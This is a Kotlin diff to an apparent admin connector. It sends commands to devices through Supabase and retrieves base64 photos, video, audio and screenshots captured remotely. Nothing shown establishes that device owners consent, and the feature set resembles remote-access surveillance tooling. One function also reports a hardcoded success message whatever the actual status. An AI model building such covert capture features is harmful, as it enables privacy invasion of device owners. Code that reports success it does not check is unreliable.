@@ -101,24 +101,12 @@ class SupabaseAdminConnector {
         commandTimestamp: Long = System.currentTimeMillis()
     ): Boolean = withContext(Dispatchers.IO) {
         
-        // Delete old commands for this device to simulate PUT behavior
-        val deleteRequest = Request.Builder()
-            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken")
-            .addSupabaseHeaders()
-            .delete()
-            .build()
-        try {
-            client.newCall(deleteRequest).execute().close()
-        } catch (e: Exception) {
-            Log.e("SupabaseConnector", "Failed to clear old commands", e)
-        }
-
-        val commandId = commandTimestamp.toString()
         val url = "$rootUrl/rest/v1/commands"
         
         val paramsJson = JSONObject()
         additionalParams.forEach { (key, value) -> paramsJson.put(key, value) }
 
+        val commandId = java.util.UUID.randomUUID().toString()
         val commandJson = JSONObject().apply {
             put("id", commandId)
             put("device_token", deviceToken)
@@ -138,6 +126,7 @@ class SupabaseAdminConnector {
             .post(body)
             .build()
 
+
         try {
             client.newCall(request).execute().use { response ->
                 if (!response.isSuccessful) {
@@ -154,6 +143,32 @@ class SupabaseAdminConnector {
             Log.e("SupabaseConnector", "Exception sending command", e)
             throw e
         }
+    }
+
+    suspend fun getCommandStatus(deviceToken: String, commandTimestamp: Long): Triple<String, String, Long>? = withContext(Dispatchers.IO) {
+        val request = Request.Builder()
+            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&timestamp=eq.$commandTimestamp&limit=1")
+            .addSupabaseHeaders()
+            .get()
+            .build()
+        try {
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) return@withContext null
+                val bodyStr = response.body?.string() ?: return@withContext null
+                if (bodyStr.startsWith("[")) {
+                    val arr = JSONArray(bodyStr)
+                    if (arr.length() > 0) {
+                        val obj = arr.optJSONObject(0)
+                        return@withContext Triple(
+                            obj.optString("status", "unknown"),
+                            "تم تنفيذ العملية بنجاح",
+                            obj.optLong("timestamp", 0L)
+                        )
+                    }
+                }
+                return@withContext null
+            }
+        } catch (e: Exception) { return@withContext null }
     }
 
     suspend fun clearCommandResponse(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
@@ -181,9 +196,14 @@ class SupabaseAdminConnector {
                     val arr = JSONArray(bodyStr)
                     if (arr.length() > 0) {
                         val obj = arr.optJSONObject(0)
+                        val status = obj.optString("status", "unknown")
+                        var msg = obj.optString("response_data", "")
+                        if (msg.isEmpty() || msg == "null") {
+                            msg = obj.optString("message", "")
+                        }
                         return@withContext Triple(
-                            obj.optString("status", "unknown"),
-                            obj.optString("message", ""),
+                            status,
+                            msg,
                             obj.optLong("command_timestamp", 0L)
                         )
                     }
@@ -314,7 +334,7 @@ class SupabaseAdminConnector {
 
     private suspend fun getMediaRecords(deviceToken: String, filterType: String): List<MediaItem> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
-            .url("$rootUrl/rest/v1/media_records?device_token=eq.$deviceToken&type=eq.$filterType&order=timestamp.desc")
+            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&order=timestamp.desc")
             .addSupabaseHeaders()
             .get()
             .build()
@@ -326,13 +346,35 @@ class SupabaseAdminConnector {
                     val arr = JSONArray(bodyStr)
                     for (i in 0 until arr.length()) {
                         val obj = arr.optJSONObject(i) ?: continue
-                        list.add(MediaItem(
-                            id = obj.optString("id"),
-                            base64 = obj.optString("base64_data"),
-                            timestamp = obj.optLong("timestamp"),
-                            type = obj.optString("type"),
-                            cameraType = obj.optString("camera_type").takeIf { it.isNotBlank() && it != "null" }
-                        ))
+                        val cmdType = obj.optString("command")
+                        
+                        // Map the commands to our filterTypes
+                        // filterType is "camera_photo", "video_record", "audio_record"
+                        val isMatch = when(filterType) {
+                            "camera_photo" -> cmdType == "take_photo"
+                            "video_record" -> cmdType == "record_video" || cmdType == "record_video_front" || cmdType == "record_video_back"
+                            "audio_record" -> cmdType == "record_audio" || cmdType == "capture_audio"
+                            else -> false
+                        }
+                        
+                        if (!isMatch) continue
+
+                        val b64 = obj.optString("response_data").takeIf { it.isNotBlank() && it != "null" }
+                               ?: obj.optString("command_response").takeIf { it.isNotBlank() && it != "null" }
+                               ?: obj.optString("result").takeIf { it.isNotBlank() && it != "null" }
+                               ?: obj.optString("image_code").takeIf { it.isNotBlank() && it != "null" }
+                               ?: obj.optString("base64_data").takeIf { it.isNotBlank() && it != "null" }
+                               ?: obj.optString("response").takeIf { it.isNotBlank() && it != "null" }
+                               
+                        if (b64 != null) {
+                            list.add(MediaItem(
+                                id = obj.optString("id"),
+                                base64 = b64,
+                                timestamp = obj.optLong("timestamp"),
+                                type = filterType,
+                                cameraType = null
+                            ))
+                        }
                     }
                 }
                 return@withContext list
@@ -340,7 +382,45 @@ class SupabaseAdminConnector {
         } catch (e: Exception) { return@withContext emptyList() }
     }
 
-    suspend fun getScreenshots(deviceToken: String) = getMediaRecords(deviceToken, "screenshot")
+    suspend fun getScreenshots(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
+        val request = Request.Builder()
+            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&order=timestamp.desc")
+            .addSupabaseHeaders()
+            .get()
+            .build()
+        client.newCall(request).execute().use { response ->
+            val bodyStr = response.body?.string() ?: throw Exception("Empty response body")
+            if (!response.isSuccessful) { throw java.lang.Exception("DB Error: $bodyStr") }
+            Log.d("SupabaseConnector", "getScreenshots payload: ${bodyStr.take(500)}")
+            val list = mutableListOf<MediaItem>()
+            if (bodyStr.startsWith("[")) {
+                val arr = JSONArray(bodyStr)
+                for (i in 0 until arr.length()) {
+                    val obj = arr.optJSONObject(i) ?: continue
+                    
+                    // The column for command response might be named differently
+                    // Try different possibilities based on user prompt.
+                    val b64 = obj.optString("response_data").takeIf { it.isNotBlank() && it != "null" }
+                           ?: obj.optString("command_response").takeIf { it.isNotBlank() && it != "null" }
+                           ?: obj.optString("result").takeIf { it.isNotBlank() && it != "null" }
+                           ?: obj.optString("image_code").takeIf { it.isNotBlank() && it != "null" }
+                           ?: obj.optString("base64_data").takeIf { it.isNotBlank() && it != "null" }
+                           ?: obj.optString("response").takeIf { it.isNotBlank() && it != "null" }
+
+                    if(b64 != null && (obj.optString("command") == "take_screenshot" || obj.optString("command") == "screenshot")) {
+                        list.add(MediaItem(
+                            id = obj.optString("id"),
+                            base64 = b64,
+                            timestamp = obj.optLong("timestamp"),
+                            type = "screenshot",
+                            cameraType = null
+                        ))
+                    }
+                }
+            }
+            return@withContext list
+        }
+    }
     suspend fun getCameraPhotos(deviceToken: String) = getMediaRecords(deviceToken, "camera_photo")
     suspend fun getCameraVideos(deviceToken: String) = getMediaRecords(deviceToken, "video_record")
     suspend fun getAudioRecords(deviceToken: String) = getMediaRecords(deviceToken, "audio_record")
@@ -373,7 +453,7 @@ class SupabaseAdminConnector {
 
     suspend fun deleteMediaItem(deviceToken: String, category: String, itemId: String): Boolean = withContext(Dispatchers.IO) {
         val request = Request.Builder()
-            .url("$rootUrl/rest/v1/media_records?id=eq.$itemId")
+            .url("$rootUrl/rest/v1/commands?id=eq.$itemId")
             .addSupabaseHeaders()
             .delete()
             .build()
